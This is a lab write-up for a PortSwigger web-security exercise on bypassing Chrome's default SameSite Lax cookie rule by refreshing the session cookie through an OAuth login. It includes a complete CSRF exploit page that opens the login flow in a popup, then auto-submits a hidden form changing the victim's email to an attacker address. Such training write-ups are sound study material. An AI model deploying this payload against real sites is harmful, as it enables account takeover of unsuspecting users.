# SameSite Lax bypass via cookie refresh

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh), you'll learn: SameSite Lax bypass via cookie refresh! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: `wiener:peter`

> Note:
>   
> The default [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113211243.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113211412.png)

**When we reach to `/`, it'll set a new session cookie for us:**
```
Set-Cookie: session=iGK1ZSaFicxmGf6YQ0vrsOyoBLUGFt1N; Expires=Sat, 14 Jan 2023 13:12:27 UTC; Secure; HttpOnly
```

As you can see, **it doesn't have attribute `SameSite`**, which means **Chrome automatically applies `Lax` restriction by default.**

Although cookies with `Lax` SameSite restrictions aren't normally sent in any cross-site `POST` requests. To avoid breaking single sign-on (SSO) mechanisms, **Chrome doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests**. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

Now try to login:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113211918.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113211926.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113211935.png)

As you can see, it's redirecting to sign-in to a social media platform, which commonly is an OAuth-based authenication.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113212035.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113212047.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113212058.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113212315.png)

**When we finished the OAuth flow, it'll assign a new session cookie for us**. Again, no `SameSite` attribute. 

My account page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113212106.png)

In here, we can update our email address.

**View source page:**
```html
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <button class='button' type='submit'> Update email </button>
    </form>
</div>
```

As you can see, **the form doesn't have a CSRF token parameter**, which helps to prevent CSRF attack.

Also, when we submit the form, **it'll send a POST request to `/my-account/change-email`, with parameter `email`.**

**Armed with above information, we can craft a CSRF payload to update victim's email address.**

But first, we need to know one thing:

we can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction.

**For example, the following popup will be blocked by the browser by default:**
```js
window.open('https://vulnerable-website.com/login/sso');
```

**To get around this, you can wrap the statement in an `onclick` event handler as follows:**
```js
window.onclick = () => { 
    window.open('https://vulnerable-website.com/login/sso');
}
```

This way, the `window.open()` method is only invoked when the user clicks somewhere on the page.

**Now let's construct our payload:**
```html
<html>
    <head>
        <title>CSRF-10</title>
    </head>
    <body>
        <form action="https://0a7b004a03249384c1cfa827009b0081.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>
        <p>Click Me!</p>
        <script>
            window.onclick = () => {
                window.open('https://0a7b004a03249384c1cfa827009b0081.web-security-academy.net/socal-login')
                setTimeout(updateEmail, 3000);
            }

            function updateEmail() {
                document.getElementsByTagName('form')[0].submit();
            }
        </script>
    </body>
</html>
```

Then host it on the exploit server and test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113214426.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113214440.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113214806.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113214817.png)

When we clicked on somewhere on the exploit page, it'll open another window to `/socal-login`, this will assign a new session cookie, which allows us to have 120 seconds to send a POST request to update the email address.

**Now, let's deliver the payload to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113214959.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-10/images/Pasted%20image%2020230113215004.png)

Nice!

# What we've learned:

1. SameSite Lax bypass via cookie refresh